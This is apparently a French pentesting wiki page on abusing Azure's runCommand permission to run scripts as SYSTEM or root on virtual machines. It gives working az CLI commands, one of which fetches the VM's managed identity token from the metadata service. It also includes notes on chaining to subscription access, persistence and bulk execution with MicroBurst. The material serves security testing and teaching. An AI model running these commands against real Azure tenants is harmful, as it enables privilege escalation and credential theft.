---
title: "Run command : exécution SYSTEM ou root avec runCommand"
order: 1
description: "Exécuter des commandes en tant que SYSTEM ou root sur une VM Azure avec l'action runCommand, sans identifiants stockés."
keywords:
  - run command
  - runCommand
  - VM
  - SYSTEM
  - exécution de code
---

# Run command

Le droit `Microsoft.Compute/virtualMachines/runCommand/action` exécute un script sur une VM via l'agent invité, en tant que **SYSTEM** sous Windows ou **root** sous Linux, sans identifiant sur l'hôte ni accès réseau entrant nécessaire. C'est le moyen le plus rapide de transformer VM Contributor (ou n'importe quel rôle portant run command) en exécution de code sur la machine et, de là, en jeton d'identité managée de la VM.

## Exécution

```bash
# Linux guest
az vm run-command invoke -g <rg> -n <vm> \
  --command-id RunShellScript --scripts "id; curl -s -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"

# Windows guest
az vm run-command invoke -g <rg> -n <vm> \
  --command-id RunPowerShellScript --scripts "whoami"
```

## Notes d'exploitation

- La sortie est retournée en ligne via le plan de gestion, donc cela fonctionne contre une VM sans IP publique et avec des NSG verrouillés.
- La chaîne classique consiste à utiliser run command pour lire le jeton d'[identité managée](managed-identity.md) de la VM, puis à agir sur l'abonnement en tant que cette identité.
- Les ressources run command persistées (`az vm run-command create`) restent attachées et se réexécutent, ce qui est plus bruyant mais durable.

## Outils

- **Azure CLI** (`az vm run-command invoke`).
- **MicroBurst** (`Invoke-AzureRmVMBulkCMD`) : exécuter une commande sur de nombreuses VM à la fois.

## Références

- [Microsoft : run command des VM Azure](https://learn.microsoft.com/azure/virtual-machines/run-command-overview)
- [NetSPI : MicroBurst](https://github.com/NetSPI/MicroBurst)
- [HackTricks Cloud : run command des VM Azure](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
